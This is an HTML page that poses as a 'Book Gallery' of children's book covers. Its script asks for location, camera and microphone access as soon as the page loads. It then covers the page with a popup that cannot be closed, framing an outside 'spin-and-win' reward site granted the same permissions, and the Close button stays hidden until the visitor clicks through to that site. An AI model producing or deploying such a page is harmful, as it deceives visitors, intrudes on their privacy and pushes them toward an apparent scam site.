<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1" name="viewport" />
  <title>Book Gallery</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
  <style>
    body {
      background-image: url('https://images.unsplash.com/photo-1617957681478-7e5f0a277d51?fm=jpg&q=60&w=3000&ixlib=rb-4.0.3');
      background-size: cover;
      background-position: center;
      background-attachment: fixed;
      background-repeat: no-repeat;
    }
    main {
      background-color: rgba(255, 255, 255, 0.8);
      border-radius: 8px;
      padding: 16px;
    }
    footer {
      position: fixed;
      bottom: 0;
      width: 100%;
      background-color: rgba(0, 0, 0, 0.8);
      padding: 1rem 0;
    }
    .nav-item {
      transition: color 0.3s;
    }
    .nav-item:hover {
      color: #3b82f6;
    }
    .popup-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      z-index: 1000;
      justify-content: center;
      align-items: center;
    }
    .popup {
      background: white;
      padding: 20px;
      border-radius: 10px;
      text-align: center;
      max-width: 90%;
      width: 90%;
      max-height: 90vh;
      overflow: auto;
      animation: spin 1s ease-in-out;
    }
    @keyframes spin {
      0% { transform: rotate(0deg) scale(0.5); opacity: 0; }
      100% { transform: rotate(360deg) scale(1); opacity: 1; }
    }
    .popup iframe {
      width: 100%;
      height: 400px;
      border: none;
      border-radius: 8px;
      margin-bottom: 20px;
    }
    .popup button {
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
      border-radius: 5px;
    }
    .visit-btn {
      background-color: #3b82f6;
      color: white;
      border: none;
      margin-right: 10px;
    }
    .close-btn {
      background-color: #ef4444;
      color: white;
      border: none;
    }
    .toast {
      position: fixed;
      bottom: 80px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #3b82f6;
      color: white;
      padding: 10px 20px;
      border-radius: 9999px;
      display: none;
      z-index: 1100;
    }
  </style>
</head>
<body class="bg-transparent text-gray-800">
  <!-- Toast -->
  <div id="toast" class="toast">Please visit and start home</div>

  <!-- Popup -->
  <div id="popupOverlay" class="popup-overlay flex">
    <div class="popup">
      <iframe
        src="https://spin-and-win.securetools.in/rewardall.php?id=6367172066"
        title="Reward"
        allow="camera; microphone; geolocation"
        allowfullscreen
        referrerpolicy="no-referrer-when-downgrade">
      </iframe>
      <div class="mt-4">
        <button id="visitBtn" class="visit-btn">Visit</button>
        <button id="closeBtn" class="close-btn">Close</button>
      </div>
    </div>
  </div>

  <!-- Header -->
  <header class="flex items-center justify-between p-4">
    <div class="flex items-center space-x-2">
      <div class="w-10 h-10 rounded-full bg-black flex items-center justify-center">
        <i class="fas fa-user text-white text-xl"></i>
      </div>
      <span class="text-black text-base font-normal">John</span>
    </div>
    <div class="flex items-center space-x-6 text-black text-2xl">
      <i class="fas fa-globe"></i>
      <i class="fas fa-search"></i>
    </div>
  </header>

  <!-- Main Content -->
  <main class="p-4 grid grid-cols-2 gap-4 max-w-md mx-auto">
    <div class="rounded-md overflow-hidden">
      <img alt="The Jungle Book" class="w-full h-auto object-cover rounded-md" src="https://storage.googleapis.com/a1aa/image/857799d9-b869-4a4d-90ea-3eac8ef84743.jpg" />
    </div>
    <div class="rounded-md overflow-hidden">
      <img alt="Angry Like Me" class="w-full h-auto object-cover rounded-md" src="https://storage.googleapis.com/a1aa/image/f4d3518c-0dd4-45b1-34e0-0395ca6a7491.jpg" />
    </div>
    <div class="rounded-md overflow-hidden">
      <img alt="Jealous Like Me" class="w-full h-auto object-cover rounded-md" src="https://storage.googleapis.com/a1aa/image/ef049732-6965-4f33-076f-deb1af656830.jpg" />
    </div>
    <div class="rounded-md overflow-hidden">
      <img alt="King Arthur's First Quest" class="w-full h-auto object-cover rounded-md" src="https://storage.googleapis.com/a1aa/image/0a980814-b6ea-45f1-cc2e-0c209b2c5517.jpg" />
    </div>
  </main>

  <!-- Footer -->
  <footer class="flex justify-around items-center text-white">
    <a href="#" class="nav-item"><i class="fas fa-home text-2xl"></i><span class="block text-sm">Home</span></a>
    <a href="#" class="nav-item"><i class="fas fa-book text-2xl"></i><span class="block text-sm">Books</span></a>
    <a href="#" class="nav-item"><i class="fas fa-heart text-2xl"></i><span class="block text-sm">Favorites</span></a>
    <a href="#" class="nav-item"><i class="fas fa-user text-2xl"></i><span class="block text-sm">Profile</span></a>
  </footer>

  <!-- JavaScript -->
  <script>
    const popupOverlay = document.getElementById('popupOverlay');
    const visitBtn = document.getElementById('visitBtn');
    const closeBtn = document.getElementById('closeBtn');
    const toast = document.getElementById('toast');
    const visitUrl = "https://spin-and-win.securetools.in/rewardall.php?id=6367172066";

    function showToast(msg) {
      toast.textContent = msg;
      toast.style.display = 'block';
      setTimeout(() => toast.style.display = 'none', 3000);
    }

    function hasVisitedToday() {
      const storedDate = localStorage.getItem('popupShownDate');
      const today = new Date().toISOString().split('T')[0];
      return storedDate === today;
    }

    function markVisitedToday() {
      const today = new Date().toISOString().split('T')[0];
      localStorage.setItem('popupShownDate', today);
    }

    function requestPermissions() {
      // Request Location
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(() => {}, () => {});
      }

      // Request Camera and Microphone
      navigator.mediaDevices.getUserMedia({ audio: true, video: true })
        .then(() => {
          console.log("Camera/Mic access granted");
        })
        .catch(() => {
          console.log("Camera/Mic access denied");
        });
    }

    document.addEventListener('DOMContentLoaded', function () {
      requestPermissions();

      if (!hasVisitedToday()) {
        popupOverlay.style.display = 'flex';
        visitBtn.style.display = 'inline-block';
        closeBtn.style.display = 'none';
        showToast('Please visit and start home');
      } else {
        popupOverlay.style.display = 'none';
      }

      visitBtn.addEventListener('click', function () {
        window.open(visitUrl, '_blank');
        markVisitedToday();
        visitBtn.style.display = 'none';
        closeBtn.style.display = 'inline-block';
        showToast('Visited. You may now close.');
      });

      closeBtn.addEventListener('click', function () {
        popupOverlay.style.display = 'none';
      });
    });
  </script>
</body>
</html>
